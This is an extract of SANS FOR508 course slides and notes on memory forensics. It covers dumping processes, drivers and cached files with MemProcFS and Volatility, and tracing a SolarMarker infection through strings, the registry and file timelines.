referenced either by name, M:\name\svchost.exe-7164\, or by pid, M:\pid\7164\. Both folders are cross-linked
and hold identical information. Once drilled into a process, various folders lead to different memory objects.
The vmemd folder is useful when tracking specific memory sections from data sources like FindEvil. The
heaps folder gives a unique way to search private memory heaps, where processes store most of their data.
For a more complete view of process memory including both code and data, go to the minidump folder. The
modules folder provides access to loaded DLLs and the process executable, each available as portable
executable objects named pefile.dll. We will discuss “cached” and “specialty” memory objects later in this
section.

160

© 2023 SANS Institute

.

160

MemProcFS: Dumping EXEs, DLLs, and Drivers

• MemProcFS exposes available objects as files
• Copy to a new location, open in hex editor, signature scan

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

161

.

One of the unique aspects of MemProcFS is it making memory objects available in a virtualized folder structure.
This extends to the actual contents of memory which are accessible via files in this folder structure. This makes
extraction of items like executables, DLLs, and drivers as easy as just copying the relevant file to a working
folder. In most cases that isn’t even necessary as you can operate on the file in place. As an example, you can
open up a memory section in a hex editor, extract strings from an executable, upload a file or hash to Virus
Total, or open a DLL in a disassembler. When running things like anti-virus scans it might be a good idea to
make a copy of the file in case it is flagged for quarantine. Objects in MemProcFS are largely read-only, but
there is no reason to create unnecessary friction with security software! Also, if you ever have a tool fail to
open a MemProcFS virtual file, a good troubleshooting step is to copy it to a local folder and try again.
Information related to executables, DLLs, and drivers are represented in many different MemProcFS folders.
The pefile.dll is the closest representation of a file in Portable Executable (PE) format (items always change as
they are loaded into memory from disk so they will never be a bit-for-bit match). You will find this file under
the “modules” folder of the process it belongs to. Each process will have references to loaded DLLs and the
executable itself under this folder (as seen on the slide with Sun075d5a7849d7670a.exe). If you do not see your
process of interest under M:\name or M:\pid, it could be due to it being an exited process. The MemProcFS
configuration folder has an option to force building of folders for terminated processes in the file. This is not
done by default because data can be missing or corrupted in exited processes. Changing the value to “1” in the
file, M:/config/config_process_show_terminated.txt, will make these folders available.
When looking at drivers, the folder for the System process will have links to most loaded drivers under its
modules folder. The System process is the first process started upon boot and kernel code, including most
drivers, runs under its umbrella. Under each of the driver folders will be a corresponding pefile.dll representing
the driver contents. Some graphics drivers (Win32k) are present under the CSRSS.exe process, but it is rare that
those will be interesting to you. MemProcFS greatly simplifies extraction of many types of memory objects, but
we will see that both it and Volatility provide different capabilities and sets of data.

© 2023 SANS Institute

.

161

Extracting Memory Objects in Volatility
Volatility 2

Volatility 3

dlldump

windows.dlllist

Dump DLLs from a process

moddump

windows.modules

Extract kernel drivers

procdump

windows.pslist

Dump a process in executable format

memdump

windows.memmap

Dump all addressable process memory

filescan

windows.filescan

Scan memory for FILE_OBJECTs

dumpfiles

windows.dumpfiles

Extract cached files via FILE_OBJECTs

mftparser

windows.mftscan

Extract and parse NTFS Master File Table

shimcachemem

N/A

Extract Application Compatibility Cache

cmdscan

N/A

Scan for COMMAND_HISTORY buffers

svcscan

windows.svcscan

Carve service info from in-memory registry

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

The final step in any memory analysis process is to extract suspicious processes, drivers, and other objects from
the memory image to enable additional analysis. This is a key step and a reminder that we can’t always wrap up
our memory analysis by using just one tool. Memory forensics can usually get us very close to understanding
what was compromised and how the malware works, but a complete understanding of the malware and all its
indicators usually requires dynamic and static malware analysis. So, once we have narrowed down our items for
additional analysis, we will need to dump them. There are a lot of different ways this could be done and many
possible results. Do we just want an image executable so we can try dynamic analysis in a sandbox? Do we want
the mapped DLLs and other files? Do we want all the memory sections so we can look at those believed to have
been injected? All these options and more are available in the Volatility framework.
Volatility has a complete set of extraction features, though not every feature has been ported to Volatility version
3. There are many plugins to choose from and although a bit cumbersome, the single-function plugins provide a
great deal of flexibility. The most important acquisition plugins for you to know are present on this slide. Notice
a shift in plugin names between Volatility versions 2 and 3. We will dig deeper into this shortly, but Volatility 3
deprecated the stand-alone dumping tools previously used and instead added dumping capabilities into many of
the standard analysis plugins via a new parameter, “--dump.” It is important to know the capabilities of both
versions of Volatility because there are times when one version can successfully extract data that the other
cannot. If you ever fail with extraction using Volatility 3, make sure to try again using the earlier version!
Volatility has a long history of innovative plugins contributed by the community. While we do not have time in
this course to cover them all, the experience you gain here should make it easy for you to practice and learn about
any plugin. Many of these “specialty” plugins may never be ported to Volatility 3, making a strong case for
understanding both versions of the tool. On this slide we highlight mftparser, which finds, extracts, and
interprets the NTFS $MFT file from memory. shimcachemem is a very important plugin used to extract
AppCompatCache entries from a memory image, including those not yet written to the SYSTEM hive
(ShimCache data only gets written to the registry upon a reboot or shutdown). It can be enlightening to compare
the output from this plugin to traditional disk-based ShimCache data on the same system. The cmdscan and
consoles plugins can carve out full command histories and text console output from memory. Finally,
svcscan, performs the important function of recovering Windows service information from memory-resident
registry keys. As you take time to practice with Volatility, start with these plugins and then run vol.py -h and
vol2.py -h to discover more!
162

© 2023 SANS Institute

.

162

Volatility: Dumping EXEs, DLLs, and Drivers

Volatility 3 merges dumping capabilities into plugins
using the --dump argument
• Process dumping using windows.pslist/pscan:

• Driver dumping using windows.modules/modscan:

163

01

.ir

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

hi

de

Many previous users of Volatility remain confused as to why the dedicated dumping plugins in version 2 were
removed. The capabilities still exist in Volatility 3, they have just been moved into the standard plugins with an
extra parameter, --dump. If you ever see this option present when looking at the plugin help, that plugin can
dump memory objects! A secondary option available with Volatility 3 is “-o”, which sets an output folder for
results to be written to (this was --dump-dir= in Volatility 2). This can be particularly important for things
like driver and DLL extraction which do not have easy ways to limit the number of files extracted. An important
thing to remember is parameter order matters in Volatility 3 (version 2 was much more permissive). The “-o”
parameter must precede the plugin while plugin specific options like --pid and --dump must go after.
Executable Extraction
The windows.pslist --dump plugin facilitates extracting suspicious processes from the memory image
for further review. By default, it will dump all of the processes within the EPROCESS doubly linked list. A
--pid option can be provided to narrow the focus to a list of process identifiers, each separated by a space.
windows.psscan --dump should be used when attempting to dump terminated or unlinked processes no
longer present in the EPROCESS list. The equivalent plugin in Volatility 2 was procdump, which allowed
extraction by PID (-p), memory offset (-o offset), or regular expression (-n name_regex).
vol.py -f memory.img -o output-folder windows.pslist --dump
vol2.py -f memory.img profile=<profile> procdump --dump-dir=output-folder
DLL Extraction
The windows.dlllist plugin is used to dump DLLs in Volatility 3 from one or more processes. By default,
it will extract all DLLs in the memory image, so limiting it by selecting specific process IDs (--pid) is a good
best practice. The equivalent plugin in Volatility 2 was dlldump, which allowed extraction by PID (-p), base
offset (-b offset), or regular expression (-r name_regex). DLLs are often shared across many processes, so it is
not unusual to extract many duplicates when dumping DLLs from multiple processes.
vol.py -f memory.img -o output-folder windows.dlllist --pid 1040 –dump
vol2.py -f memory.img profile=<profile> dlldump --dump-dir=output-folder –p
1040

© 2023 SANS Institute

.

163

Driver Extraction
When you have identified potentially malicious drivers within a memory image, a next logical step is to extract
them from the image for further review and analysis. The plugin windows.modules --dump makes this
easy. By default, windows.modules --dump will dump all of the kernel drivers in the memory image, so
providing an output folder (“-o”) is very important. windows.modscan --dump should be used if you are
looking for deeper recovery to include unlinked or unloaded drivers not currently in the drivers list. The
equivalent plugin in Volatility 2 was moddump which allowed extraction by base offset (-b offset) or regular
expression (-r name_regex).
vol.py -f memory.img -o output-folder windows.modules --dump
vol2.py -f memory.img profile=<profile> moddump --dump-dir=output-folder

.

Keep in mind there are no guarantees that any process objects will be contained in memory image. It is a
common occurrence for all or part of objects to be paged out of RAM, causing extraction to fail or provide only
partial data. Adding the page file to your analysis can greatly help with this and will be a topic covered later in
this section.

164

© 2023 SANS Institute

.

Dumping All Process Memory

• Process memory includes code and data sections
• Code = useful for IOCs and reverse engineering
• Data = useful for data recovery and behavioral analysis

pslist --dump (.exe)
memmap --dump (All)
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

165

.

While file extraction from memory is typically straightforward, it is a bit more complex with respect to process
memory. The tool you use can have drastic consequences on the data available for analysis. Generally speaking,
process memory is comprised of memory sections that contain code and sections that contain data owned by the
process. One way to think of process code is as a close approximation of the original executable. The Volatility
windows.pslist --dump command and the MemProcFS M:\<process>\modules\<exe
name>\pefile.dll file provide this view of process memory. It can be used for indicator of compromise
(IOC) generation and for code reverse engineering. If you were to extract the pe.dll file for a PowerShell
process, you would largely expect to find code written by Microsoft. Depending on the tool doing the
extraction, code could also include mapped code from other sources like DLLs and drivers.
The other part of process memory can loosely be referred to as data, and it typically represents many more
memory sections. In the example on this slide, you see output from Volatility pslist (code) and memmap (all
process memory locations) differing by over 600MB. This is where you might expect to find buffers that could
have command lines, typed text, or loaded PowerShell scripts and modules in the case of a PowerShell process.
Malware domain generation algorithm output could be in this part of process memory, giving insight into
network connections. Different tools dump different aspects of this type of process memory, depending on
whether heap and stack data is included along with other private memory.
The process dumping tools in Volatility are clear cut in their definitions. The windows.pslist plugin will
attempt to extract a close replica to the original executable when provided the “--dump” option (Volatility 2
used the procdump plugin for this). The windows.memmap --dump plugin iterates through the process
VAD tree and extracts all memory resident pages into a file (similar to the Vol2 memdump plugin). This will
contain everything: both code and data. It can be large but is ideal for string searching. MemProcFS recreates
the executable as a file named pefile.dll. The file named memory.vmem (seen on this slide), represents
all of process memory in MemProcFS, but it literally represents all possible process space, making it unwieldy.
In our example here it is a 2TB file! Even though most of the space is zeroes, it doesn’t lend itself to easy
searching with most tools. The most usable file MemProcFS currently has for conducting tasks like string
searching is the minidump.dmp file for each process. Located in the minidump folder, it contains stack, heap,
executable, and loaded DLLs, but will be missing many private memory locations. It is good for a first pass, but
the Volatility windows.memmap plugin is the more comprehensive choice.
© 2023 SANS Institute

.

165

.
166

© 2023 SANS Institute

.

Searching Memory

• strings
-t d print decimal offset
-e l extract Unicode
-<num> only strings >= num

• grep
-i ignore case
-B <num> show num lines before
-f <filename> list of strings

• bstrings
--lr search for regex
--ls search for string
--fs <filename> list of strings
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

167

.

String searching is a very common forensic technique, useful for a wide range of investigative efforts, including
memory analysis, malware reverse engineering, and searching unallocated space of a disk image. Much of the
evidence we are looking for on a system is represented as strings—IP addresses, domain names, filenames,
internet communications, malware command and control packets, and even usernames and passwords. You can
search everything from extracted process memory, memory sections, page files, and even entire memory images
with the following tools.
Linux ships with a strings tool capable of extracting English ASCII and Unicode strings from a data stream. A
good best practice is to use the –t d option in order to get the exact byte offsite (location) of the string in
question. The byte offset will be the number listed at the beginning, followed by the string. If you find a hit of
interest, you can go back to that location in the original data stream and look at other information around it to
determine context. Standard practice with this tool often has us running strings twice: once for Unicode strings
(with the –e l option) and once for ASCII strings. Once generated, these two files can be combined into a single
strings file. Some simple command lines follow:
strings -a -t d file > strings.txt
strings -a -t d -e l file >> strings.txt
sort strings.txt > sorted_strings.txt
Once you have your strings file created, the next step is to search. Grep, a tool commonly found natively in *nix
environments (like the Linux SIFT Workstation), is a surprisingly efficient and powerful search tool. Typically,
all strings are first extracted from a dataset prior to executing grep to identify pattern matches. Of course, the
real magic is knowing what to search for. Your keyword list should be a living document, growing and
contracting as you learn more about whatever you are investigating. You can search for a single string (or
regular expression) at a time, or if you have several, the "-f" option allows grep to search against a file
containing a list of expressions. For those who are not masters of regular expressions, there are many pre-built
regexes available online along with many great tutorials. Since grep is run under a case-sensitive Linux context,
capitalization matters and the “-i” option can force the tool to ignore capitalization:
grep -i search_term sorted_strings.txt
© 2023 SANS Institute

.

167

An interesting alternative to the tools above is bstrings.exe, by Eric Zimmerman.[1] In the past this tool was only
available in Windows, but it was recently ported to .NET6 allowing it to be even faster and also run in Linux.
You will find it on both of your SIFT workstations (bstrings from the command line). While primarily a
strings utility, bstrings has some unique capabilities like extracting both ASCII and Unicode strings at the same
time and the ability to also perform initial searches. Searches can be accomplished individually, with a file of
many search terms, or with regular expressions. One helpful feature is a collection of common regular
expressions already pre-built into the tool. This slide shows many of these built-in searches that include IP
address, registry hive and file paths, and even URL detection.
bstrings -f file -m 8 (find all strings of length 8 or greater)
bstrings -f file --ls search_term (find all instances of search term string)
bstrings -f file --lr ipv4 (use a regex to find IP version 4 addresses)

.

Windows 10+ Memory Compression
Starting with Windows 10, memory compression is common for the page file as well as infrequently used areas
of RAM. This is a performance optimization reducing the number of page faults and takes advantage of the
seamless decompression capabilities now available in multi-core CPUs. From a forensic perspective, this means
our memory forensic tools might report less data unless they are able to decompress these memory areas. As an
example, scanning plugins might find less data if they cannot reliably decompress data for signature matching.
Both Volatility 3 and MemProcFS report capabilities for dealing with compressed memory, but at the time of
writing, MemProcFS seems to be far ahead in this category, perhaps because it is running natively on Windows
(this is one good reason to only use the Windows version of MemProcFS). Compression also diminishes our
ability to pull human-readable strings from memory files. This should be less of a problem if you use a tool like
MemProcFS to extract memory objects but can be a big issue if you are doing a search across an entire memory
image or page file. In these situations, we need a tool to scan memory for signs of compression and output the
uncompressed data. Maxim Suhanov wrote the script winmem_decompress.py to perform these actions.[2]
It is a slow process, but the results are telling as it is not unusual to get over 150% more data back from a
provided memory image. The output of this tool cannot be subsequently analyzed by a memory forensic tool. It
is really designed to be used for string searching, carving, or scanning memory for YARA signatures. As an
example, a common part of some analyst’s process is to run the page_brute.py YARA scanner on the
pagefile.sys file. This technique will be much less effective for files taken from Windows 10 systems due to
compression. Running a tool like winmem_decompress.py first provides more viable data to search.
[1] bstrings: A better strings utility: http://for508.com/0nxs8
[2] GitHub winmem_decompress.py: https://for508.com/icws9

168

© 2023 SANS Institute

.

Putting It All Together: Searching a SolarMarker Infection

Dump conhost.exe
Build strings file
Search for indicators

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

169

.

Although we have some very powerful memory forensic capabilities, analysts often end up performing many
string searches across memory objects. Malicious or injected processes are an obvious place into which to look
deeper. This slide demonstrates a less obvious but equally powerful technique, searching for command history.
The idea of carving out command history dates back to a seminal paper by Stevens and Casey, Extracting
Windows command line details from physical memory.[1] The basic idea is the csrss.exe (XP) and conhost.exe
(Win7+) processes are responsible for drawing and maintaining text consoles like cmd.exe and powershell.exe.
As such, elements of those consoles are maintained within their assigned memory pages. Searching through
process memory of conhost.exe can yield valuable information related to those console applications.
This example shows us analyzing a system infected with SolarMarker. The primary suspicious process in this
case was a rogue PowerShell process. While that process would also make a great target for investigation, here
we pulled all strings out of its child conhost.exe process with the hope of finding command history data. The
conhost.exe PID 6388 process was dumped and then a strings file was generated with the bstrings utility.
Next, the strings file was searched for indicators of compromise identified earlier in the investigation. This
example shows a search for a very peculiar spelling of a “MiCrOsoFt” folder and a subsequent hit for a
PowerShell transcript file. That transcript shows a very interesting sub-folder, C:\Users\Admin\AppData\
Roaming\MiCrOsoFt\NsaCWeSQcZlTKFVOHq, and what appears to be a randomly named registry key:
HKCU\software\classes\jxbflnlzzotwmagpb\shell\open. The latter opened up the door to understanding a very
sneaky malicious persistence mechanism, which was stored as a PowerShell script within the registry.
BlackBerry security published a good analysis of a similar attack by the SolarMarker\Jupyter malware.[2]
Two Volatility 2 plugins, cmdscan and consoles are designed to find and extract command line history for
memory, but in our experience, they are not a replacement for the very simple but powerful technique of manual
review of strings output.
[1] Extracting Windows Command Line Details from Physical Memory (PDF): http://for508.com/ql3hc
[2] Jupyter Infostealer is a Master of Disguise: https://for508.com/t9or3

© 2023 SANS Institute

.

169

.
170

© 2023 SANS Institute

.

Page Files

• Memory analysis tools can now take advantage of page files
• MemProcFS:
MemProcFS.exe -device memory.img -pagefile0 pagefile.sys

• Volatility 3:
vol.py –f memory.img --single-swap-locations=pagefile.sys

• Many advantages:
• File extraction
• Injected code recovery
• Scanning for memory objects
• Network Connections
• Registry data

• Paged hiding techniques
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

171

Memory architecture is built around the concept of virtual, or paged memory, with large amounts of active
memory actually located on disk. Page files are heavily used even on systems with an overabundance of RAM.
Without context, files like the Windows pagefile.sys are largely a collection of seemingly random data that once
existed in RAM. Thus, analysis of page files has traditionally consisted of simple strings analysis or file carving.

.

The latest generation of tools now supports integration of page files with a memory image, which is a large step
forward. The Rekal project (a fork of Volatility) started the trend and Volatility 3 and MemProcFS both include
support. Testing indicates MemProcFS is currently the leader and pagefile.sys inclusion can enhance both
detections in tools like FindEvil and provide more extractable memory objects. Testing in Volatility 3 has not
demonstrated many results, but the capability is clearly available, so we expect future improvements.
There are many tangible advantages provided by the addition of paging data. You should see less extraction
errors for processes, DLLs, and drivers. The odds of detecting and getting good copies of injected malware
improve as more memory locations are available for scanning and recovery. More extreme examples include
several malware hiding techniques in the wild actively paging out evil content for evasion purposes. Many
memory analysis capabilities take advantage of “scanning” to find old or exited data structures and page files
increase the amount of data available to scan. Including the page file can improve everything from better
detection of old beacon network traffic to more complete copies of things like master file table entries and
registry hives. For all these reasons and more it is worth including page files into your investigations. While the
Windows pagefile.sys is by far the most important, modern versions of Windows also maintain a
swapfile.sys file that is used by Universal Windows Platform applications. MemProcFS can also ingest
data from this latter file by adding the argument “-pagefile1 swapfile.sys”.
Most of all, this new capability should prompt us to adjust our collection priorities to also include page files
along with memory acquisition.

© 2023 SANS Institute

.

171

MemProcFS Cached Files (SolarMarker)

files\handles

Extract files using process handles to File_Objects

files\modules

Extract .EXE, .DLL, and .SYS files using PEB

files\vads

Extract files from VAD tree pointers to File_Objects

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

The Windows operating system caches many files in memory. This includes items that are frequently in use and
hence should be in memory to improve file system input/output efficiency (e.g., registry hives, Prefetch files,
and the $MFT), memory mapped files like executables and DLLs, and virtually any type of file that happens to
have been recently loaded into memory like Word and PDF documents, or log files.[1] Files can even be cached
when opened from removable media like USB devices or from encrypted containers! Cached items are tracked
via in-memory data structures named File_Objects. Processes maintain pointers to File_Object data structures
via their process handle table and virtual address descriptor (VAD) tree. Memory analysis tools can enumerate
these data structures and use the information within them to extract cached files.
In MemProcFS, objects are represented as individual files and can be copied from the mounted drive or
analyzed in place. MemProcFS represents cached items under the files folder for each process, providing
three different ways to access cached files.[2] These three methods provide a comprehensive and unparalleled
capability to recover memory cached files:
• handles: Provides access to cached files discovered using process handles pointing to File_Objects
• modules: Recovers .exe,.dll, and .sys files via the Process Environment Block (PEB) and PE headers
• vads: Attempts file reconstruction using VAD tree information
This slide steps through the process of identification of an item of interest, finding a File_Object reference to
that item, and then extracting the item for further analysis. This example comes from a system infected with
SolarMarker, also known as Jupyter malware. Some variants of this malware family use .msi (Microsoft
Installer) files instead of executables to evade host-based security and automated malware detonation sandboxes
(sadly, this evasion technique actually works). A big giveaway in this memory image was msiexec.exe PID 6192
being present in the process list. This indicates software installation, which is always interesting during malware
investigations. While the majority of .msi files are almost certainly legitimate, a previous review of file handles
for that process showed a pointer to a file named “\Windows\flash_installer.msi”. With Adobe
Flash being a dead product but still often used in social engineering lures, we would absolutely be interested in
the contents of that file. In an attempt to recover the suspicious file, the MemProcFS files\handles folder
for that process was analyzed. In a lucky break, a suspicious .msi file was still present in memory and made

172

© 2023 SANS Institute

.

172

available in this folder. Notice the naming convention, ffffa002b614aef0-flash_installer.msi
Also, notice the size of the file coming in at over 120 megabytes! This is actually a ploy by the malware. The
malware is packaged with other legitimate software and even digitally signed to blend in. The large size is
intentional because some security products skip large files for efficiency purposes. The next step would be to
copy this file to a working folder and start analyzing the malware. Does it get any easier than that? This is a
great example of how the direct access to memory objects provided by MemProcFS facilitates rapid analysis.

.

[1] Physical Memory Forensics for Files and Cache (PDF): http://for508.com/-3sch
[2] MemProcFS Wiki - FS_Process_Files: https://for508.com/znwuh

© 2023 SANS Institute

.

173

Extracting Cached Files Using Volatility

.

The Volatility project also includes plugins to find and extract cached files. The windows.dumpfiles plugin
is designed to extract cached versions of files using File_Object data structures. By default, it will attempt to
extract all available cached files within the memory image. This collection will contain executables, DLLs,
system files like registry hives and .dat databases, and data files like text files or PDF and Office documents.
This will likely be a large number of files, many of which will be uninteresting to the investigation. A more
targeted approach can use the --pid argument to limit recovery to only File_Objects tied to specific processes.
windows.filescan is a specialized plugin used to scan for File_Object signatures in memory. It is
particularly complementary to dumpfiles because it provides visibility into objects which might ordinarily be
missed. For instance, dumpfiles identifies only File_Objects within the VAD tree or in process handles lists
and hence will not recover closed or maliciously manipulated File_Objects. In addition, NTFS special files such
as $MFT and $Logfile are not present in the VAD tree and will not be recovered by dumpfiles by default. In
general, the windows.filescan plugin can do a more thorough job of file searching in memory. If you find
something of interest, record the provided virtual offset of the File_Object in memory. That memory offset can
then be provided to windows.dumpfiles with the --virtaddr argument to attempt recovery.

As you are certainly aware by now, there are no guarantees in memory forensics, so do not be too disappointed
if your file of interest cannot be extracted! Not every File_Object will have data currently memory mapped or
cached. The file might be paged out, or only chunks of the file might be available (the plugin pads unavailable
regions with zeros). Hence, many file extractions result in failure or in corrupt or unreadable files. As an
example, while registry hives are frequently present in memory, opening extracted versions of these files in a
registry viewer often fails because of missing data. Tools like MemProcFS and some of the specialized
Volatility plugins like windows.registry.printkey parse only parts of the registry, providing access to
whatever is available. Even if the file of interest cannot be recovered, remember the existence of a file on a
system can sometimes be just as useful. For instance, showing a known malicious executable was once present
on a system allows you to treat the system as compromised and triage accordingly.
Equivalent plugins in Volatility 2: dumpfiles and filescan. The former can extract files via offset (-Q) or via a
regular expression for the name (-r) (add -i for case insensitive). Similar to other Volatility 2 plugins, --dumpdir= is used to designate the output folder.

174

© 2023 SANS Institute

.

MemProcFS Cached Files Repository

• MemProcFS creates a reconstructed file system
from cached file objects: M:\forensic\files\ROOT
• M:\forensic\csv\files.csv lists all files for searching

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

175

.

If you were impressed with the access to cached files that MemProcFS provides, you are going to love this next
feature! When the “forensic” options of MemProcFS are enabled, it will gather all potentially recoverable
File_Objects and provide access to them via a reconstructed file system. In the last example, we were looking
for any pertinent files tied to the msiexec.exe process, specifically, .msi files which could indicate what was
installed on the system. An alternative solution would be to search the M:\forensic\csv\files.csv file
for file names or file types of interest. Items of interest can then be accessed via the virtualized file system
present in M:\forensic\files\ROOT. In the example on the slide, notice how easy it is to access files of
interest via Windows File Explorer. These files could be copied elsewhere, or depending on the file type,
immediately opened with a hex editor, image viewer, or the Microsoft Office suite. Keep in mind that nothing is
guaranteed in memory, and the file you are interested in could be partially paged out. Thus, it is very possible to
encounter corrupted and incomplete files and viewers which are tolerant of corruption are preferred.
The capabilities of this feature are only limited by your imagination. As one example, imagine we wanted to
recover deleted Prefetch files from memory. You could copy the contents of the Prefetch file, or just point the
parser directly at the virtualized folder. Magic!

© 2023 SANS Institute

.

175

Specialty Objects: MemProcFS File System Info
ntfs

Navigate contents in File Explorer

csv | timeline

MFT record parsing

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

The MemProcFS forensic\files feature provides access to cached File_Objects in memory. That will, of
course, be a subset of the total files on disk. To investigate the complete file system, use the forensic\ntfs
folder. Behind the scenes, MemProcFS searches for the NTFS Master File Table ($MFT) and virtualizes its
contents, allowing an analyst to peruse the file system as if they were on the original system.

.

Similar information can also be found in a timeline format, with the creation and modification times of files
placed into chronological order. The forensic\timeline folder keeps a variety of timelines in text format
and the forensic\csv folder maintains CSV versions of the same timelines. The CSV versions can be
immediately opened by a viewer like Timeline Explorer for filtering and analysis. The file
timeline_ntfs.csv contains file system data while other timelines focus on other in-memory objects.
The example on this slide continues with findings previously identified in a SolarMarker malware infection.
Recall the previous example of dumping conhost.exe memory to look for commands and the discovery of a
PowerShell transcript in process memory. The transcript identified a very interesting folder, C:\Users\Admin\
AppData\Roaming\MiCrOsoFt\NsaCWeSQcZlTKFVOHq. MemProcFS makes it trivial to follow this lead and
identify the folder and its contents. Notice the path followed on the slide, starting with
M:\forensic\ntfs\_\Users. In this example the folder still existed and housed over a hundred randomly
named files. This is actually a hallmark of SolarMarker, which creates many fake files while hiding a handful of
real files among them. This is likely done to slow down or confuse investigators, but it looks very evil.
Unfortunately, it is very rare to have file contents present under the forensic\ntfs folder because the data
is solely sourced from the $MFT. However, if a file is resident in the MFT (a concept we will discuss later in the
course), the contents may be available. Typically, this is only for very small (<600 byte) files. However, don’t
forget you also have the means to extract cached versions of files, so going back to review locations like
M:\forensic\files could be a good next step. The next slide shows the timeline output of this same
folder, including creation times of the folder and file contents.
There are many great use cases for this feature. You can use it to review the contents of tool folders, folders
used for exfiltration staging, cloud storage folders, and even folders like Prefetch where the creation and
modification times of the Prefetch files will tell you first and last time executed!

176

© 2023 SANS Institute

.

176

.
© 2023 SANS Institute

.

177

Specialty Objects: MemProcFS Registry

01

.ir

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

hi

de

Similar to the MemProcFS M:\forensic\ntfs folder, the M:\registry folder provides access to
memory resident registry data, allowing investigators to interact with the various keys and values via Windows
File Explorer, or export reconstructed registry hives for analysis with alternate tools. Exported registry hives can
be found in the M:\registry\hive_files folder but will often be in a partial and corrupted state,
preventing many tools from opening them. If this is the case, the next best option is to just navigate to the
registry hive and key of interest and see if value contents are available. The virtual file structure provided by
MemProcFs makes this easy. In this example we were looking for a registry key found during analysis of a
SolarMarker malware infection. Recall the previous example of dumping conhost.exe memory to look for
commands and the discovery of a PowerShell transcript in process memory. The transcript identified a very
interesting sub-folder and an apparently random named registry key,
HKCU\software\classes\jxbflnlzzotwmagpb\shell\open\. While HKCU typically indicates the NTUSER.DAT
hive of the currently logged in user, a subtle clue in this path actually points to a different user hive named
UsrClass.dat. On a running system, the UsrClass.dat hive is virtualized into the HKCU\software\classes folder
(the FOR500 course covers these hives in much mor detail). So, in this example, we find the available
UsrClass.dat hive in the M:\registry\by-hive folder and navigate to the unusually named key and its
sub-keys. MemProcFS virtualizes any key contents as text files within these folders. Notice the “command” key
has a text file named “(Default).txt” representing its contents. Opening that text file revealed an encoded
PowerShell script nicely hidden inside the registry. This script is the persistence mechanism for the malware and
is stored in the registry to be “file-less” and evade host-based security tools. BlackBerry security published a
good analysis of a similar attack by the SolarMarker\Jupyter malware.[1]
Volatility includes multiple registry-based plugins including, windows.registryhivelist,
windows.registry.hivescan, windows.registry.printkey, and
windows.registry.userassist, but none make it as easy as MemProcFS does to navigate and interact
with registry contents.
[1] Jupyter Infostealer is a Master of Disguise: https://for508.com/t9or3

178

© 2023 SANS Institute

.

178

.
© 2023 SANS Institute

.

179

Specialty Objects: MemProcFS Services and Tasks
M:\forensic\csv\services.csv

M:\forensic\csv\tasks.csv

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Services and scheduled tasks are very commonly abused by attackers to run code, solidify persistence, and
laterally move in the network. A large percentage of attacks include these capabilities and hence retrieving this
information from memory can be very valuable. Both Windows services and tasks are written into the Windows
registry and since retrieving registry information from memory is possible, all we need is a tool to go find and
parse the information. MemProcFS brings this capability to analysts in two locations. The folders
M:\sys\services and M:\sys\tasks virtualize the contents of these data sources into individual folders
and text files representing each service or scheduled task. Alternatively, this data is presented as CSV files in the
M:\forensic\csv folder, as seen on this slide. These CSV files are ready to open up in your favorite viewer
and bring a wealth of information to the analyst. Services include both process information and loaded drivers,
making this an excellent place to find very advanced attacks like rootkits. Filtering on “Start Type” is possible
(SERVICE_AUTO_START is commonly abused for persistence), and full path and arguments are provided for
both services and tasks making it easy to look for suspicious locations and file names. There are also many more
columns of information available than what you see on this slide, including timestamps. A good pro-tip is to also
pay attention to the “User” information. Most services and tasks should be running using built-in system
accounts. Those running under a user account context should be given extra attention. The ability to analyze this
data directly from a memory image can be a game changer for many investigations. It is worth extending yet
another thank you to Ulf Frisk for his work on this remarkable tool!
The Volatility windows.svcscan plugin can extract registry-based service information from a memory
image similar to output provided by MemProcFS.

180

© 2023 SANS Institute

.

180

Extracting Processes, Drivers, and Objects Review
• Exporting suspected memory locations and files for
further review is very common during memory analysis
• Volatility uses dedicated plugins for specific dumping
• dlllist, pslist, modules, memmap, dumpfiles, mftscan

• MemProcFS simplifies process object interaction
• Folders like vmemd, modules, files, & forensics provide access

• Once extracted, many choices exist for analysis:
• Antivirus and indicator of compromise scanning engines
• Malware analysis sandboxes
• Dynamic malware analysis
• Static malware debugging and disassembly
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

181

.

Acquiring processes and drivers is the last step in our memory analysis process. Memory analysis can tell us
many things, but it can’t always tell us everything. Very commonly, we will need to extract processes, drivers, or
memory sections out of the image to perform more in-depth analysis. It is very common to find three or four
suspicious processes that you just aren’t 100% sure about. Extracting the corresponding process objects and
getting confirmation from an antivirus scan can help you determine if you are on the right track.
Like what we have seen in other sections, Volatility has a large set of plugins that perform very specific dumping
functions. While giving added power and flexibility, the sheer number of plugins can be overwhelming at first.
You have good references in this section, and they will become second nature with practice.
MemProcFS has delighted the forensic community with its ease of use, speed, and simplicity. It makes it trivial
to interact with virtually any process object. The ability to drill into a folder of process objects, find a file of
interest and then right-click on it to open in a hex editor is revelatory the first time accomplished.
Once we have our files of interest identified and extracted, a wealth of options are available for further analysis.
Capabilities range from submitting files to an antivirus scan or automated threat scanning engine to reverse
engineering an executable or driver to uncover its traits.

© 2023 SANS Institute

.

181

Putting It All Together

1
2
3
4
5
6

• Identify rogue processes

• Name, path, parent, command line, and start time

• Analyze process objects
• Loaded DLLs, handles, SIDs

• Review network artifacts
• Suspicious ports, connections, and processes

• Look for evidence of code injection
• Injected memory sections and process hollowing

• Audit drivers and rootkit detection
• Audit drivers and evidence of rootkit hooks

• Dump suspicious processes and drivers
• Review strings, antivirus scan, and reverse engineer

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Congratulations! We have now completed the six-step memory analysis process.

182

© 2023 SANS Institute

.

182

Scaling Analysis: Live Memory Forensics

Live memory forensics is the next evolutionary step
• Stand-alone live detection tools
• Get-InjectedThread (also available in Kansa)
• moneta
• hollows_hunter

• Velociraptor was designed for scalable live memory audits
• MemProcFS Remoting allows forensics over the network

